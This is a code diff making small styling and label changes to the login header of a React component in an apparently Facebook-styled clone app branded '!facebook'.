@@ -1,6 +1,7 @@
 import axios from "axios";
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
+import "./css/base.css";
 
 export default function ForgotHeader() {
   const navigate = useNavigate();
@@ -58,8 +59,8 @@ export default function ForgotHeader() {
   };
 
   return (
-    <div className="flex flex-col items-center">
-      <div className="flex justify-between items-center p-2 shadow-sm bg-[#feffff] w-full">
+    <div className="flex flex-col items-center ">
+      <div className="flex justify-between items-center  p-2 shadow-sm bg-[#feffff] w-[100%] pl-5 pr-5">
         <h1 className="text-[#0866ff] font-bold text-3xl">!facebook</h1>
         <form onSubmit={handleLogin} className="flex gap-2">
           <input
@@ -90,11 +91,11 @@ export default function ForgotHeader() {
           <button
             type="submit"
             disabled={loading}
-            className={`w-[50%] bg-[#0866ff] rounded-[5px] text-white pt-1 pb-1 font-bold text-[1.1em] ${
+            className={`w-[50%] bg-[#0866ff] rounded-[5px] text-white pt-1 pb-1 font-bold text-[1.1em] cursor-pointer ${
               loading ? "opacity-50 cursor-not-allowed" : "hover:bg-blue-600"
             }`}
           >
-            {loading ? "Logging in..." : "Log In"}
+            {loading ? "Log In" : "Log In"}
           </button>
         </form>
       </div>
